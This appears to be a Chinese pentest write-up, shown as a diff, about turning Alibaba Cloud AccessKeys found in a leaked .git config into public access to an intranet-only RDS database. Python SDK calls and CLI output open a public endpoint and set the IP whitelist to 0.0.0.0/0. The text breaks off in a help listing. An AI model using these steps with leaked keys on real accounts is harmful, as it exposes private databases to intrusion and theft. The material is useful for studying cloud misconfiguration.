@@ -1,0 +1,342 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="b21ad4d63a157d80c623de4c36cb9dfc">前言</h2>
+<p>在某次和地方组织前期渗透侦查中(已授权), 通过/.git/获取到网站源码，查看配置文件发现该系统使用OSS进行文件存储,但是网站迟迟shell不下。通过.git对文件进行恢复，得到信息如下：<br/>
+1.网站部分源码，但是审计相当耗时。<br/>
+2.查看配置文件发现数据库采用阿里云RDS，且阿里云RDS为内网地址。<br/>
+3.网站对文件上传采用OSS进行文件存储。</p>
+<p>如果是你，shell拿不到，RDS仅对内，3306端口不通，SQL注入，RCE等常见漏洞又没有，改怎么办?</p>
+<h2 data-content="1" id="23f4e2a7b10c66dbb2a05feea08e5135">信息收集</h2>
+<p>配置信息如下：</p>
+<div class="highlight"><pre><span></span><span class="x">ACCESSKEYID=XXXXX</span>
+<span class="x">ACCESSKEYSECRET=XXXXX</span>
+<span class="x">ENDPOINT=oss-cn-beijing.aliyuncs.com</span>
+<span class="x">DB_HOST=rm-xxxxx.mysql.rds.aliyuncs.com</span>
+<span class="x">DB_PORT=3306</span>
+<span class="x">DB_USER=xxxx</span>
+<span class="x">DB_PASSWORD=xxxxx</span>
+</pre></div>
+<p>之前了解过，通过KEYID（非子账户）,可以获取到阿里云的服务器权限，例如某些运维平台支持类似这种使用。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201028150303-9f3b48c8-18eb-1.png"/></p>
+<p>但是这些服务器的密码并不知道，及时知道，大部分服务器VPC对外仅开了80，443，而且异地登录会发送告警，这样的方法不可取。</p>
+<h2 data-content="1" id="5364079e5609bd9da83ad5e1d7d7ea61">利用方式</h2>
+<p>获取到MYSQL，但是通过ping，可以看到实际上是一个内网IP，其实服务器是在一个VPC里，也就是数据库只允许内网来链接，这样我们怎么办呢，可能都束手无策了吧。</p>
+<p>主要需要分析数据，但是RDS并不允许连接。查询阿里云相关文件，发现RDS其实也可以使用ACCESSKEY来进行操作的。</p>
+<p>通过阿里云官网，可以下载工具Rdscli <a href="https://market.aliyun.com/products/53690006/cmgj000311.html#sku=mianfeiban" target="_blank">https://market.aliyun.com/products/53690006/cmgj000311.html#sku=mianfeiban</a></p>
+<p>查看相关文档，配置就不再次啰嗦了，文档里面都包含：</p>
+<p>通过key查看账户下RDS相关实例：</p>
+<div class="highlight"><pre><span></span>rds DescribeDBInstances --PageSize <span class="m">50</span>
+</pre></div>
+<p>返回如下：</p>
+<div class="highlight"><pre><span></span><span class="o">[</span>root@localhost Rdscli<span class="o">]</span><span class="c1"># rds DescribeDBInstances --PageSize 50</span>
+----------------------------------------------------------------------------------------
+<span class="p">|</span>                     DescribeDBInstances                                                    <span class="p">|</span>
++-------------------+----------------------------------------------------------------+
+<span class="p">|</span>  PageNumber               <span class="p">|</span>  <span class="m">1</span>                                                              <span class="p">|</span>
+<span class="p">|</span>  PageRecordCount       <span class="p">|</span>  <span class="m">6</span>                                                               <span class="p">|</span>
+<span class="p">|</span>  RequestId                  <span class="p">|</span>  XXXXXXXX-XXXX-4A0B-97C1-C5XXXXXXXXXX <span class="p">|</span>
+<span class="p">|</span>  TotalRecordCount      <span class="p">|</span>  <span class="m">6</span>                                                                <span class="p">|</span>
++-------------------+-----------------------------------------------------------------+
+<span class="o">||</span>                           Items                                                                  <span class="o">||</span>
+<span class="p">|</span>+-----------------------------------------------------------------------------------+<span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>                             DBInstance                                                    <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span>+-------------------------+-----------------------------------------------------+<span class="o">||</span>
+<span class="o">||</span><span class="p">|</span>  ConnectionMode            <span class="p">|</span>  Standard                                          <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  CreateTime                   <span class="p">|</span>  <span class="m">2020</span>-08-14T12:46:23Z                      <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  DBInstanceClass             <span class="p">|</span>     rds.mysql.s3.large                         <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  DBInstanceDescription   <span class="p">|</span>  rr-XXXXXXXXXXXXXXXXX                     <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  DBInstanceId                 <span class="p">|</span>  rr-XXXXXXXXXXXXXXXXX                     <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  DBInstanceNetType       <span class="p">|</span>  Intranet                                            <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  DBInstanceStatus           <span class="p">|</span>  Running                                            <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  DBInstanceStorageType  <span class="p">|</span>                                                         <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  DBInstanceType             <span class="p">|</span>  Readonly                                          <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  Engine                           <span class="p">|</span>  MySQL                                              <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  EngineVersion                <span class="p">|</span>  <span class="m">8</span>.0                                                   <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  ExpireTime                    <span class="p">|</span>  <span class="m">2020</span>-10-14T16:00:00Z                       <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  InsId                              <span class="p">|</span>  <span class="m">1</span>                                                      <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  InstanceNetworkType     <span class="p">|</span>  VPC                                                  <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  LockMode                      <span class="p">|</span>  Unlock                                               <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  LockReason                   <span class="p">|</span>                                                           <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  MasterInstanceId            <span class="p">|</span>  rm-XXXXXXXXXXXXXXXXX                   <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  MutriORsignle                <span class="p">|</span>  False                                                 <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  PayType                        <span class="p">|</span>  Prepaid                                             <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  RegionId                        <span class="p">|</span>  cn-beijing                                         <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  ResourceGroupId           <span class="p">|</span>  rg-XXXXXXXXXXXXXXX                         <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  VSwitchId                      <span class="p">|</span>  vsw-XXXXXXXXXXXXXXXXXXXXX           <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  VpcCloudInstanceId       <span class="p">|</span>  rr-XXXXXXXXXXXXXXXXX                     <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  VpcId                            <span class="p">|</span>  vpc-XXXXXXXXXXXXXXXXXXXXX           <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span><span class="p">|</span>  ZoneId                          <span class="p">|</span>      cn-beijing-h                                   <span class="o">||</span><span class="p">|</span>
+<span class="o">||</span>+--------------------------------+------------------------------------------------+<span class="o">||</span>
+</pre></div>
+<p>通过工具获取实例ID，查看某个实例信息：</p>
+<div class="highlight"><pre><span></span>rds ExportDBInstance --DBInstanceId rr-XXXXXXX  --filename <span class="nb">test</span>
+</pre></div>
+<p>返回实例详细信息：</p>
+<div class="highlight"><pre><span></span><span class="p">{</span>
+    <span class="nt">"Items"</span><span class="p">:</span> <span class="p">{</span>
+        <span class="nt">"DBInstanceAttribute"</span><span class="p">:</span> <span class="p">[</span>
+            <span class="p">{</span>
+                <span class="nt">"Category"</span><span class="p">:</span> <span class="s2">"HighAvailability"</span><span class="p">,</span>
+                <span class="nt">"SupportUpgradeAccountType"</span><span class="p">:</span> <span class="s2">"No"</span><span class="p">,</span>
+                <span class="nt">"InsId"</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+                <span class="nt">"LockMode"</span><span class="p">:</span> <span class="s2">"Unlock"</span><span class="p">,</span>
+                <span class="nt">"ConnectionString"</span><span class="p">:</span> <span class="s2">"rr-xxxxxxxxxx.mysql.rds.aliyuncs.com"</span><span class="p">,</span>
+                <span class="nt">"MasterInstanceId"</span><span class="p">:</span> <span class="s2">"rm-xxxxxxxxxxxx"</span><span class="p">,</span>
+                <span class="nt">"DBInstanceStorageType"</span><span class="p">:</span> <span class="s2">"local_ssd"</span><span class="p">,</span>
+                <span class="nt">"DBInstanceNetType"</span><span class="p">:</span> <span class="s2">"Intranet"</span><span class="p">,</span>
+                <span class="nt">"ReadDelayTime"</span><span class="p">:</span> <span class="s2">"0"</span><span class="p">,</span>
+                <span class="nt">"ReadOnlyDBInstanceIds"</span><span class="p">:</span> <span class="p">{</span>
+                    <span class="nt">"ReadOnlyDBInstanceId"</span><span class="p">:</span> <span class="p">[]</span>
+                <span class="p">},</span>
+                <span class="nt">"SupportCreateSuperAccount"</span><span class="p">:</span> <span class="s2">"No"</span><span class="p">,</span>
+                <span class="nt">"MaxConnections"</span><span class="p">:</span> <span class="mi">2000</span><span class="p">,</span>
+                <span class="nt">"DBInstanceClassType"</span><span class="p">:</span> <span class="s2">"x"</span><span class="p">,</span>
+                <span class="nt">"Engine"</span><span class="p">:</span> <span class="s2">"MySQL"</span><span class="p">,</span>
+                <span class="nt">"AvailabilityValue"</span><span class="p">:</span> <span class="s2">"100.0%"</span><span class="p">,</span>
+                <span class="nt">"CanTempUpgrade"</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+                <span class="nt">"VpcId"</span><span class="p">:</span> <span class="s2">"vpc-xxxxxxxxxxx"</span><span class="p">,</span>
+                <span class="nt">"IPType"</span><span class="p">:</span> <span class="s2">"IPv4"</span><span class="p">,</span>
+                <span class="nt">"DBMaxQuantity"</span><span class="p">:</span> <span class="mi">99999</span><span class="p">,</span>
+                <span class="nt">"ConnectionMode"</span><span class="p">:</span> <span class="s2">"Standard"</span><span class="p">,</span>
+                <span class="nt">"RegionId"</span><span class="p">:</span> <span class="s2">"cn-beijing"</span><span class="p">,</span>
+                <span class="nt">"SlaveZones"</span><span class="p">:</span> <span class="p">{</span>
+                    <span class="nt">"SlaveZone"</span><span class="p">:</span> <span class="p">[]</span>
+                <span class="p">},</span>
+                <span class="nt">"ResourceGroupId"</span><span class="p">:</span> <span class="s2">"rg-xxxx"</span><span class="p">,</span>
+                <span class="nt">"VSwitchId"</span><span class="p">:</span> <span class="s2">"vsw-xxxxxx"</span><span class="p">,</span>
+                <span class="nt">"InstanceNetworkType"</span><span class="p">:</span> <span class="s2">"VPC"</span><span class="p">,</span>
+                <span class="nt">"ExpireTime"</span><span class="p">:</span> <span class="s2">"2020-10-14T16:00:00Z"</span><span class="p">,</span>
+                <span class="nt">"ConsoleVersion"</span><span class="p">:</span> <span class="s2">""</span><span class="p">,</span>
+                <span class="nt">"DBInstanceType"</span><span class="p">:</span> <span class="s2">"Readonly"</span><span class="p">,</span>
+                <span class="nt">"DBInstanceStatus"</span><span class="p">:</span> <span class="s2">"Running"</span><span class="p">,</span>
+                <span class="nt">"ProxyType"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+                <span class="nt">"DispenseMode"</span><span class="p">:</span> <span class="s2">"ClassicDispenseMode"</span><span class="p">,</span>
+                <span class="nt">"CreationTime"</span><span class="p">:</span> <span class="s2">"2020-08-14T12:46:23Z"</span><span class="p">,</span>
+                <span class="nt">"SecurityIPMode"</span><span class="p">:</span> <span class="s2">"normal"</span><span class="p">,</span>
+                <span class="nt">"SuperPermissionMode"</span><span class="p">:</span> <span class="s2">""</span><span class="p">,</span>
+                <span class="nt">"AutoUpgradeMinorVersion"</span><span class="p">:</span> <span class="s2">"Auto"</span><span class="p">,</span>
+                <span class="nt">"EngineVersion"</span><span class="p">:</span> <span class="s2">"8.0"</span><span class="p">,</span>
+                <span class="nt">"CurrentKernelVersion"</span><span class="p">:</span> <span class="s2">"rds_20200630"</span><span class="p">,</span>
+                <span class="nt">"DBInstanceDiskUsed"</span><span class="p">:</span> <span class="mi">67697115136</span><span class="p">,</span>
+                <span class="nt">"IncrementSourceDBInstanceId"</span><span class="p">:</span> <span class="s2">"rm-xxxxxxx"</span><span class="p">,</span>
+                <span class="nt">"VpcCloudInstanceId"</span><span class="p">:</span> <span class="s2">"rr-xxxxxxx"</span><span class="p">,</span>
+                <span class="nt">"DBInstanceMemory"</span><span class="p">:</span> <span class="mi">8192</span><span class="p">,</span>
+                <span class="nt">"MaxIOPS"</span><span class="p">:</span> <span class="mi">5000</span><span class="p">,</span>
+                <span class="nt">"DedicatedHostGroupId"</span><span class="p">:</span> <span class="s2">""</span><span class="p">,</span>
+                <span class="nt">"DBInstanceStorage"</span><span class="p">:</span> <span class="mi">100</span><span class="p">,</span>
+                <span class="nt">"DBInstanceDescription"</span><span class="p">:</span> <span class="s2">"rr-xxxxxxx"</span><span class="p">,</span>
+                <span class="nt">"Extra"</span><span class="p">:</span> <span class="p">{</span>
+                    <span class="nt">"DBInstanceIds"</span><span class="p">:</span> <span class="p">{</span>
+                        <span class="nt">"DBInstanceId"</span><span class="p">:</span> <span class="p">[]</span>
+                    <span class="p">}</span>
+                <span class="p">},</span>
+                <span class="nt">"LatestKernelVersion"</span><span class="p">:</span> <span class="s2">"rds_20200630"</span><span class="p">,</span>
+                <span class="nt">"DBInstanceId"</span><span class="p">:</span> <span class="s2">"rr-xxxxxxxxxxxx"</span><span class="p">,</span>
+                <span class="nt">"PayType"</span><span class="p">:</span> <span class="s2">"Prepaid"</span><span class="p">,</span>
+                <span class="nt">"AccountMaxQuantity"</span><span class="p">:</span> <span class="mi">99999</span><span class="p">,</span>
+                <span class="nt">"OriginConfiguration"</span><span class="p">:</span> <span class="s2">""</span><span class="p">,</span>
+                <span class="nt">"MaintainTime"</span><span class="p">:</span> <span class="s2">"18:00Z-22:00Z"</span><span class="p">,</span>
+                <span class="nt">"DBInstanceCPU"</span><span class="p">:</span> <span class="s2">"4"</span><span class="p">,</span>
+                <span class="nt">"AccountType"</span><span class="p">:</span> <span class="s2">"Mix"</span><span class="p">,</span>
+                <span class="nt">"DBInstanceClass"</span><span class="p">:</span> <span class="s2">"rds.mysql.s3.large"</span><span class="p">,</span>
+                <span class="nt">"SecurityIPList"</span><span class="p">:</span> <span class="s2">""</span><span class="p">,</span>
+                <span class="nt">"Port"</span><span class="p">:</span> <span class="s2">"3306"</span><span class="p">,</span>
+                <span class="nt">"ZoneId"</span><span class="p">:</span> <span class="s2">"cn-beijing-h"</span>
+            <span class="p">}</span>
+        <span class="p">]</span>
+    <span class="p">},</span>
+    <span class="nt">"RequestId"</span><span class="p">:</span> <span class="s2">"A1A4E351-1778-xxxx-9D57-xxxxxxx"</span>
+</pre></div>
+<p>然后我自己在阿里云注册了一个看看RDS平台提供的功能：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201028150508-e9d92bb6-18eb-1.png"/><br/>
+注册发现，实际上RDS分为内网域名和外网域名的，默认是不开外网地址的，需要自己去申请，查看的RDS ConnectionString 很明显是一个内网的地址。</p>
+<p>查询官方API，发现有支持此功能的API：</p>
+<p>调用AllocateInstancePublicConnection接口申请实例的外网地址</p>
+<p><a href="https://help.aliyun.com/document_detail/26234.html?spm=a2c4g.11186623.6.1655.6eb83c34jOC0ON" target="_blank">https://help.aliyun.com/document_detail/26234.html?spm=a2c4g.11186623.6.1655.6eb83c34jOC0ON</a></p>
+<p>申请外网地址代码如下：</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#coding=utf-8</span>
+
+<span class="kn">from</span> <span class="nn">aliyunsdkcore.client</span> <span class="kn">import</span> <span class="n">AcsClient</span>
+<span class="kn">from</span> <span class="nn">aliyunsdkcore.acs_exception.exceptions</span> <span class="kn">import</span> <span class="n">ClientException</span>
+<span class="kn">from</span> <span class="nn">aliyunsdkcore.acs_exception.exceptions</span> <span class="kn">import</span> <span class="n">ServerException</span>
+<span class="kn">from</span> <span class="nn">aliyunsdkrds.request.v20140815.AllocateInstancePublicConnectionRequest</span> <span class="kn">import</span> <span class="n">AllocateInstancePublicConnectionRequest</span>
+
+<span class="n">client</span> <span class="o">=</span> <span class="n">AcsClient</span><span class="p">(</span><span class="s1">'&lt;accessKeyId&gt;'</span><span class="p">,</span> <span class="s1">'&lt;accessSecret&gt;'</span><span class="p">,</span> <span class="s1">'cn-beijing'</span><span class="p">)</span>
+
+<span class="n">request</span> <span class="o">=</span> <span class="n">AllocateInstancePublicConnectionRequest</span><span class="p">()</span>
+<span class="n">request</span><span class="o">.</span><span class="n">set_accept_format</span><span class="p">(</span><span class="s1">'json'</span><span class="p">)</span>
+
+<span class="n">request</span><span class="o">.</span><span class="n">set_DBInstanceId</span><span class="p">(</span><span class="s2">"DBInstanceId"</span><span class="p">)</span>
+<span class="n">request</span><span class="o">.</span><span class="n">set_ConnectionStringPrefix</span><span class="p">(</span><span class="s2">"public_domain"</span><span class="p">)</span>
+<span class="n">request</span><span class="o">.</span><span class="n">set_Port</span><span class="p">(</span><span class="s2">"3306"</span><span class="p">)</span>
+
+<span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">do_action_with_exception</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+<span class="c1"># python2:  print(response) </span>
+<span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">'utf-8'</span><span class="p">))</span>
+</pre></div>
+<p>开通完外网域名之后，我们再去查询一下RDS实例域名地址：</p>
+<p>调用DescribeDBInstanceNetInfo接口查询实例的所有连接地址信息:</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#coding=utf-8</span>
+
+<span class="kn">from</span> <span class="nn">aliyunsdkcore.client</span> <span class="kn">import</span> <span class="n">AcsClient</span>
+<span class="kn">from</span> <span class="nn">aliyunsdkcore.acs_exception.exceptions</span> <span class="kn">import</span> <span class="n">ClientException</span>
+<span class="kn">from</span> <span class="nn">aliyunsdkcore.acs_exception.exceptions</span> <span class="kn">import</span> <span class="n">ServerException</span>
+<span class="kn">from</span> <span class="nn">aliyunsdkrds.request.v20140815.DescribeDBInstanceNetInfoRequest</span> <span class="kn">import</span> <span class="n">DescribeDBInstanceNetInfoRequest</span>
+
+<span class="n">client</span> <span class="o">=</span> <span class="n">AcsClient</span><span class="p">(</span><span class="s1">'&lt;accessKeyId&gt;'</span><span class="p">,</span> <span class="s1">'&lt;accessSecret&gt;'</span><span class="p">,</span> <span class="s1">'cn-hangzhou'</span><span class="p">)</span>
+
+<span class="n">request</span> <span class="o">=</span> <span class="n">DescribeDBInstanceNetInfoRequest</span><span class="p">()</span>
+<span class="n">request</span><span class="o">.</span><span class="n">set_accept_format</span><span class="p">(</span><span class="s1">'json'</span><span class="p">)</span>
+
+<span class="n">request</span><span class="o">.</span><span class="n">set_DBInstanceId</span><span class="p">(</span><span class="s2">"DBInstanceId"</span><span class="p">)</span>
+
+<span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">do_action_with_exception</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+<span class="c1"># python2:  print(response) </span>
+<span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">'utf-8'</span><span class="p">))</span>
+</pre></div>
+<p>返回如下：</p>
+<div class="highlight"><pre><span></span><span class="p">{</span>
+    <span class="nt">"RequestId"</span><span class="p">:</span> <span class="s2">"xxxx-xx-xx-xx-xxxxxxx"</span><span class="p">,</span>
+    <span class="nt">"DBInstanceNetInfos"</span><span class="p">:</span> <span class="p">{</span>
+        <span class="nt">"DBInstanceNetInfo"</span><span class="p">:</span> <span class="p">[</span>
+            <span class="p">{</span>
+                <span class="nt">"IPType"</span><span class="p">:</span> <span class="s2">"Private"</span><span class="p">,</span>
+                <span class="nt">"VPCId"</span><span class="p">:</span> <span class="s2">"vpc-xxxxxxxxx"</span><span class="p">,</span>
+                <span class="nt">"Port"</span><span class="p">:</span> <span class="s2">"3306"</span><span class="p">,</span>
+                <span class="nt">"VSwitchId"</span><span class="p">:</span> <span class="s2">"vsw-xxxxxx"</span><span class="p">,</span>
+                <span class="nt">"Upgradeable"</span><span class="p">:</span> <span class="s2">"Disabled"</span><span class="p">,</span>
+                <span class="nt">"ConnectionString"</span><span class="p">:</span> <span class="s2">"rm-xxxxxx.mysql.rds.aliyuncs.com"</span><span class="p">,</span>
+                <span class="nt">"IPAddress"</span><span class="p">:</span> <span class="s2">"172.xx.xxx.xxx"</span><span class="p">,</span>
+                <span class="nt">"SecurityIPGroups"</span><span class="p">:</span> <span class="p">{</span>
+                    <span class="nt">"securityIPGroup"</span><span class="p">:</span> <span class="p">[]</span>
+                <span class="p">},</span>
+                <span class="nt">"DBInstanceWeights"</span><span class="p">:</span> <span class="p">{</span>
+                    <span class="nt">"DBInstanceWeight"</span><span class="p">:</span> <span class="p">[]</span>
+                <span class="p">},</span>
+                <span class="nt">"ConnectionStringType"</span><span class="p">:</span> <span class="s2">"Normal"</span>
+            <span class="p">},</span>
+            <span class="p">{</span>
+                <span class="nt">"IPType"</span><span class="p">:</span> <span class="s2">"Public"</span><span class="p">,</span>
+                <span class="nt">"VPCId"</span><span class="p">:</span> <span class="s2">""</span><span class="p">,</span>
+                <span class="nt">"Port"</span><span class="p">:</span> <span class="s2">"3306"</span><span class="p">,</span>
+                <span class="nt">"VSwitchId"</span><span class="p">:</span> <span class="s2">""</span><span class="p">,</span>
+                <span class="nt">"Upgradeable"</span><span class="p">:</span> <span class="s2">"Disabled"</span><span class="p">,</span>
+                <span class="nt">"ConnectionString"</span><span class="p">:</span> <span class="s2">"rm-xxxxxxxxxxx.mysql.rds.aliyuncs.com"</span><span class="p">,</span>
+                <span class="nt">"IPAddress"</span><span class="p">:</span> <span class="s2">"xxx.xxx.xxx.xxx"</span><span class="p">,</span>
+                <span class="nt">"SecurityIPGroups"</span><span class="p">:</span> <span class="p">{</span>
+                    <span class="nt">"securityIPGroup"</span><span class="p">:</span> <span class="p">[]</span>
+                <span class="p">},</span>
+                <span class="nt">"DBInstanceWeights"</span><span class="p">:</span> <span class="p">{</span>
+                    <span class="nt">"DBInstanceWeight"</span><span class="p">:</span> <span class="p">[]</span>
+                <span class="p">},</span>
+                <span class="nt">"ConnectionStringType"</span><span class="p">:</span> <span class="s2">"Normal"</span>
+            <span class="p">}</span>
+        <span class="p">]</span>
+    <span class="p">},</span>
+    <span class="nt">"SecurityIPMode"</span><span class="p">:</span> <span class="s2">"normal"</span><span class="p">,</span>
+    <span class="nt">"InstanceNetworkType"</span><span class="p">:</span> <span class="s2">"VPC"</span>
+<span class="p">}</span>
+</pre></div>
+<p>这样就获取到这个RDS外网地址了，获取外网地址，发现端口不通。</p>
+<p>测试发现我自己的也不通，看来是网络的问题了，查一下文档：</p>
+<p>解决RDS外网无法访问：<a href="https://help.aliyun.com/knowledge_detail/96028.html#2" target="_blank">https://help.aliyun.com/knowledge_detail/96028.html#2</a></p>
+<p>1、确认访问RDS实例的IP地址已添加到RDS白名单。如果未添加，请参见设置白名单，进行设置。</p>
+<p>2、检查ECS实例的安全组。<br/>
+　　登录云服务器管理控制台。<br/>
+　　找到该实例，单击管理进入实例详情页面，在左侧导航栏，单击本实例安全组。在内网出方向安全全部规则中确认不存在对RDS实例的限制策略。<br/>
+　　请检查是否开启了高安全白名单模式，具体请参见高安全白名单模式。如果已开启，需确保设备公网IP地址已添加到经典网络的分组。</p>
+<p>　　注意：专有网络的分组不适用于公网。</p>
+<p>3、查看RDS实例的状态，检查是否存在因为磁盘空间超出购买规格限制而被锁定。在实例锁定期间，应用无法对RDS数据库进行读写操作，详情请参见如何排查MySQL实例空间满后自动锁定的原因。</p>
+<p>4、通过查看RDS实例的性能监控。<br/>
+　　其他性能问题请参见解决CPU、内存、空间、IOPS使用率偏高的问题。<br/>
+　　如是业务正常增长，建议您对实例进行配置升级。<br/>
+　　说明：升配过程中可能会有一次30s左右的闪断，建议用户做好连接重连机制，保证用户业务的正常运行，具体信息请参考RDS使用须知。<br/>
+5、确认白名单中添加的设备公网IP地址为设备真正的出口IP地址。IP地址填写错误的原因如下：</p>
+<p>　　设备的公网IP地址不固定，可能会变动。<br/>
+　　IP地址查询工具或网站查询的公网IP地址不准确。关于确认设备公网IP地址的方法，请参见定位本地IP。</p>
+<p>6、确认使用的连接地址为RDS的外网地址。</p>
+<p>看了下我自己的：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20201028150638-1fb25690-18ec-1.png"/><br/>
+ RDS默认是127.0.0.1，拒绝所有的，所以我们需要设置一下，允许我们来链接，这样就不会因为火墙就不会导致端口不通了。</p>
+<p>可以先查一下IP白名单：</p>
+<p>调用DescribeDBInstanceIPArrayList接口查询RDS实例IP白名单。</p>
+<p><a href="https://help.aliyun.com/document_detail/26241.html?spm=a2c4g.11186623.6.1715.34013a167E3PKs" target="_blank">https://help.aliyun.com/document_detail/26241.html?spm=a2c4g.11186623.6.1715.34013a167E3PKs</a></p>
+<p>调用DescribeDBInstanceAttribute接口查询RDS实例的详细信息。</p>
+<p><a href="https://help.aliyun.com/document_detail/26231.html?spm=5176.10695662.1996646101.searchclickresult.5afd39f8vo1M3l" target="_blank">https://help.aliyun.com/document_detail/26231.html?spm=5176.10695662.1996646101.searchclickresult.5afd39f8vo1M3l</a></p>
+<div class="highlight"><pre><span></span><span class="c1"># 查询IP白名单</span>
+<span class="n">request</span> <span class="o">=</span> <span class="n">DescribeDBInstanceIPArrayListRequest</span><span class="p">()</span>
+<span class="n">request</span><span class="o">.</span><span class="n">set_accept_format</span><span class="p">(</span><span class="s1">'json'</span><span class="p">)</span>
+
+<span class="n">request</span><span class="o">.</span><span class="n">set_DBInstanceId</span><span class="p">(</span><span class="s2">"rm-xxxxxxxxx"</span><span class="p">)</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">do_action_with_exception</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+</pre></div>
+<p>然后我们再添加一下IP白名单：</p>
+<p>调用ModifySecurityIps接口修改RDS实例IP白名单。</p>
+<p><a href="https://help.aliyun.com/document_detail/26242.html?spm=a2c4g.11186623.6.1717.14755667CITNGy" target="_blank">https://help.aliyun.com/document_detail/26242.html?spm=a2c4g.11186623.6.1717.14755667CITNGy</a></p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">aliyunsdkrds.request.v20140815.ModifySecurityIpsRequest</span> <span class="kn">import</span> <span class="n">ModifySecurityIpsRequest</span>
+
+
+<span class="n">client</span> <span class="o">=</span> <span class="n">AcsClient</span><span class="p">(</span><span class="s1">'xxxxx'</span><span class="p">,</span> <span class="s1">'xxxxxxx'</span><span class="p">,</span> <span class="s1">'cn-beijing'</span><span class="p">)</span>
+
+<span class="c1"># 修改IP白名单</span>
+
+<span class="n">request</span> <span class="o">=</span> <span class="n">ModifySecurityIpsRequest</span><span class="p">()</span>
+<span class="n">request</span><span class="o">.</span><span class="n">set_accept_format</span><span class="p">(</span><span class="s1">'json'</span><span class="p">)</span>
+
+<span class="n">request</span><span class="o">.</span><span class="n">set_DBInstanceId</span><span class="p">(</span><span class="s2">"rm-xxxxxxx"</span><span class="p">)</span>
+<span class="n">request</span><span class="o">.</span><span class="n">set_SecurityIps</span><span class="p">(</span><span class="s2">"0.0.0.0/0"</span><span class="p">)</span>
+
+<span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">do_action_with_exception</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+<span class="c1"># python2:  print(response)</span>
+<span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="p">))</span>
+</pre></div>
+<p>设置0.0.0.0/0所有对外就都可以链接了。</p>
+<p>这样，我们就获得了RDS的外网域名，RDS外网访问权限。</p>
+<p>刚才说的工具命令也提供了部分功能：</p>
+<div class="highlight"><pre><span></span><span class="o">[</span>root@localhost Rdscli<span class="o">]</span><span class="c1"># rds help</span>
+usage: rds &lt;operation&gt; <span class="o">[</span>options and parameters<span class="o">]</span>
+<span class="o">[</span>rds<span class="o">]</span> valid operations as follows:
+
+CancelImport                                 <span class="p">|</span> CreateAccount
+CreateBackup                                 <span class="p">|</span> CreateDBInstance
+CreateDBInstanceForChannel                   <span class="p">|</span> CreateDBInstanceforFirstPay
+CreateDatabase                               <span class="p">|</span> CreatePostpaidDBInstance
+CreateTempDBInstance                         <span class="p">|</span> CreateUploadPathForSQLServer
+DeleteAccount                                <span class="p">|</span> DeleteDBInstance
+DeleteDatabase                               <span class="p">|</span> DescribeAccounts
+DescribeBackupPolicy                         <span class="p">|</span> DescribeBackups
+DescribeBinlogFiles                          <span class="p">|</span> DescribeDBInstanceAttribute
+DescribeDBInstancePerformance                <span class="p">|</span> DescribeDBInstances
+DescribeDatabases                            <span class="p">|</span> DescribeErrorLogs
+DescribeFilesForSQLServer                    <span class="p">|</span> DescribeImportsForSQLServer
+DescribeOptimizeAdviceByDBA                  <span class="p">|</span> DescribeOptimizeAdviceOnBigTable
+DescribeOptimizeAdviceOnExcessIndex          <span class="p">|</span> DescribeOptimizeAdviceOnMissIndex
